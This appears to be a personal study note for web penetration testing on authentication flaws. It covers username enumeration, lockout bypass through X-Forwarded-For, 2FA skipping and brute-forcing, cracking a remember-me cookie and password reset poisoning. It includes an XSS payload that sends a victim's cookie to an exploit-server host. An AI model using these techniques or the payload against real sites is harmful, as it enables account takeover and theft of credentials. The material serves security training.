	# Authentication Vulns 

## Introduction 
Authentication vulnerabilities can allow attackers to gain access to sensitive data and functionality

## Where to find ? 
- everywhere 
## How to exploit

### Username enumeration and brute-force
- submit several bad login attempts for an account u control 
- After 10 failed login attempts, if the application does not return a message about account lockout, attempt to log in correctly. If it works, then there is no lockout mechanism.
	- run brute force attack
		- submit a request with a valid username and valid password.
		- submit a request with a valid username and invalid password.
		- submit a request with an invalid username
		- check for diff between responses (u can use comparer in burp)
			- status code
			- any redirects 
				- 302 when password is correct
			- info displayed on screen 
				- wrong password when username is correct
			- HTML page source
			- time to process the request
				- ![[Pasted image 20230908165356.png]]
				- if the username is correct => long time process 
- if the account is locked, try to bypass the lock mechanism 
	- `X-Forwarded-For: randomIp` => change the ip where the requests is sent from
	- if the lock happens after 4 fails attempts e.g, try to do a successful login in the 4th request, then do 3 brute force requests, etc .. 
- sometimes u will only get locked if the user u trying to bruteforce his password exists, hence, u can enumerate usernames
	- once u got the right username, brute force his password
### 2FA Vulns
- login with an account u have a control on, enter the 2FA code, check the home page path
- if u enter the victim's user and password, then a 2FA code is required, try to just go to the home page without entering the 2FA code, because the website may not check whether u enterd the 2FA code or not
- in the below case, if there is a cookie used to determine which account will be logged into, u can brute force the victim 2FA code if there is no brute force protection mechanism
```
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=victim-user
...
verification-code=123456
```
### Keeping users logged in Auth
- ![[Pasted image 20230908201343.png]]
	- crack the MD5 hash, make use of payload processing in burp
- it's possible to obtain the victim's cookie via xss vuln
```js
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```


### Resetting passwords using a URL -  Password reset poisoning
- u can specify which user u will reset his password because the token is not validated based on specific user
	- ![[Pasted image 20230908210731.png]]
	- change the username to the victim username
	- This token should expire after a short period of time and be destroyed immediately after the password has been reset.
- If the URL that is sent to the user is dynamically generated based on controllable input, such as the Host header, it may be possible to construct a password reset poisoning attack
	- The attacker obtains the victim's email address or username, as required, and submits a password reset request on their behalf. When submitting the form, they intercept the resulting HTTP request and modify the** Host header or X-Forwarded-Host** so that it points to a domain that they control. For this example, we'll use `evil-user.net`.
	- The victim receives a genuine password reset email directly from the website`https://evil-user.net/reset?token=0a1b2c3d4e5f6g7h8i9j`
	- when he click the link, u will receive the token
	- supply the victim token and change his password :)
### Password Change Functionality
- submit a valid current password and new and confirm, (valid request)
- submit a valid current password, but unmatched new and confirm  pass's
- submit an invalid current password, but matched new and confirm pass's
- submit an invalid current password, but unmatched new and confirm pass's
### Vulnerable Transmission of Credentials
- if HTTP only ? 
	- use wireshark as POC to sniff the data being submitted
### Insecure Forgot Password Functionality
- perform a complete walk-through of the forgot password functionality using an account you have control of while intercepting the requests / responses in a proxy.
- Review the functionality to determine if it allows for username enumeration or brute- force attacks
- If the application generates an email containing a recovery URL, obtain a number of these URLs and attempt to identify any predictable patterns or sensitive information included in the URL. Also check if the URL is long lived and does not expire.
### Defects in Multistage Login Mechanism
- perform a complete walk-through using an account you have control of while intercepting the requests / responses in a proxy.
- Review the functionality to determine if it allows for username enumeration or brute- force attacks.
- ![[Pasted image 20230908161102.png]]
